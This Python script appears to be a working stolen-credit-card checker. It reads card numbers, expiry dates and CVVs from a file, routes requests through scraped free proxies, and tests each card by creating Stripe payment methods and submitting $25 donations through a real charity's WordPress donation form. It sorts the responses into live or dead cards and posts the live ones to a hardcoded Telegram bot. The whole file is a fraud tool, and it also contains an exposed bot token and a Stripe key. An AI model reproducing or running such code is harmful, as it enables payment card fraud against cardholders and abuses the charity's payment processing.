import requests, os, re, urllib3, time
from bs4 import BeautifulSoup
urllib3.disable_warnings()


ccn=["Your card's security code is incorrect.", "security code is invalid", "incorrect_cvc"]

nsf=["Your card has insufficient funds."]


live=['\\status: \\succeeded', 'Thank you', 'Payment successful', 'Thank you for your Payment', 'cvc_check: pass', 'Successfully', 'redirect_url:', 'approved_by_network', 'https://pay.stripe.com/receipts/', 'cvc_check: pass', 'card_approved', 'success',]

def chkResponse(data):
    for ok in live:
        if ok.upper() in data.upper():
            return "LIVE"
    for ok in ccn:
        if ok.upper() in data.upper():
            return "CCN"
    for ok in nsf:
        if ok.upper() in data.upper():
            return "LIVE NSF"
    return "DEAD"

bot_token="6862864490:AAF-12HQLeHYE5vRqBQo5yj-c7PyOJ8e3dk"
chat_id="6460596929"
def sendIP(cc):
    requests.get(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text="+cc)

def getProxy(html):
    return re.findall("\\d{1,3}(?:\\.\\d{1,3}){3}(?::\\d{1,5})?", html)

def sendRequest():
    h= {
    "Host": "www.sslproxies.org",
    "sec-ch-ua": "\"Not?A_Brand\";v\u003d\"8\", \"Chromium\";v\u003d\"108\", \"Google Chrome\";v\u003d\"108\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "dnt": "1",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
    "accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "accept-language": "en-IN,en-GB;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7"
    }
    req=requests.get("https://www.sslproxies.org/", headers=h, verify=False).text 
    return req

def getHTTPProxy():
    proxies=getProxy(sendRequest())
    ok=[]
    for proxy in proxies:
        if len(proxy.split(":"))==2:
           # print(proxy)
            ok.append(proxy)
    ip=ok[0].split(":")[0]
    return {"http"  : "http://"+ok[0]}, ip



def chk(cc, mon, year, cvv, charge="1"):
    start_time = time.perf_counter ()
    amt="100"
    proxy, ip=getHTTPProxy()
    h1= {
    "Host": "api.stripe.com",

    "sec-ch-ua": "\"Not?A_Brand\";v\u003d\"8\", \"Chromium\";v\u003d\"108\", \"Google Chrome\";v\u003d\"108\"",
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "dnt": "1",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://js.stripe.com",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://js.stripe.com/",
    "accept-language": "en-IN,en-GB;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7"
    }
    d1=f"type=card&card[number]={cc}999&card[cvc]={cvv}&card[exp_month]={mon}&card[exp_year]={year}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F18b0f5a540%3B+stripe-js-v3%2F18b0f5a540&time_on_page=35949&key=pk_live_51MKRvaHo7XmjvMtTyheSnLDNmEwi9YoChShpKqqWj2Y9Qztz3R56AmlwomoW2jpRHbQN3kD2D6cCiEi23jcBhQBB00KlFZmYCM"
    req1=requests.post("https://api.stripe.com/v1/payment_methods", headers=h1, data=d1, proxies=proxy, verify=False)
   # print(req1.text)
    if req1.status_code==402:
        msg=req1.json()["error"]["message"]
        end_time = time.perf_counter()
        takenTime=str(end_time - start_time)[:4]+"s"
        return f"DEAD ~ MSG: {msg} ~ IP: {ip} ~ Time Taken: {takenTime}"
    pmID=req1.json().get("id")
    if pmID:
        pass
    else:
        return "ERROR: PM ID NOT FOUND ~ IP: "+ip
    h2= {
    "Host": "craythomastrimblefoundation.com",
    "sec-ch-ua": "\"Not?A_Brand\";v\u003d\"8\", \"Chromium\";v\u003d\"108\", \"Google Chrome\";v\u003d\"108\"",
    "dnt": "1",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
    "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "accept": "*/*",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://craythomastrimblefoundation.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://craythomastrimblefoundation.com/donations/",
    "accept-language": "en-IN,en-GB;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7"
    }
    d2='data=__fluent_form_embded_post_id%3D514%26_fluentform_15_fluentformnonce%3D48318c6c21%26_wp_http_referer%3D%252Fdonations%252F%26names%255Bfirst_name%255D%3DCharlie%26names%255Blast_name%255D%3DPuth%26email%3Dtizi.esc9276%2540gmail.com%26input_radio%3DMyself%26payment_input%3D%252425%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'+pmID+'&action=fluentform_submit&form_id=15'
    req2=requests.post("https://craythomastrimblefoundation.com/wp-admin/admin-ajax.php", headers=h2, data=d2, proxies=proxy, verify=False).text


   # soup = BeautifulSoup(req2, 'html.parser')
 #   result = soup.find('div', {'id': 'card-errors'}).text.strip()
    #if result:
    #    return False, result
   # else:
     #   return True, "Charged $"+charge


    end_time = time.perf_counter()
    takenTime=str(end_time - start_time)[:4]+"s"
    #{
  #"status": "card_declined",
#  "message": "Your card was declined.",
 # "transaction_id": null}
    ok=chkResponse(req2)
    if "DEAD" in ok:
        return f"DEAD ~ IP: {ip} ~ Time Taken: {takenTime}"

    else:
        if "CCN" in ok:
            return f"LIVE ~ CCN ~ IP: {ip} ~ Time Taken: {takenTime}"
        if "LIVE" in ok:
            if "NSF" in ok:
                return f"LIVE ~ MSG: INSUFFICIENT FUNDS ~ CCN ~ IP: {ip} ~ Time Taken: {takenTime}"
            return f"LIVE ~ MSG: Success ~ CHARGED $25 ~ IP: {ip} ~ Time Taken: {takenTime}" 
    return f"DEAD ~ IP: {ip} ~ Time Taken: {takenTime}"

def readFile(filename):
    s=""
    with open(filename, "r") as f:
        tmp=f.readlines()
        for u in tmp:
            s=s+u
    return s.split("\n")

def main():
    f=input("Enter File Name:")
    CCS=readFile(f)
    for CC in CCS:
        try:
            temp=CC.split("|")
            ccn=temp[0]
            m=temp[1]
            y=temp[2]
            cvv=temp[3]
            msg=chk(ccn, m, y, cvv)
            if "LIVE" in msg:
                sendIP(msg)
            print(CC)
            print(msg)
            print()
        except KeyboardInterrupt:
            exit()
        except Exception as e:
            print("ERROR")
            print(e)
            pass
main()
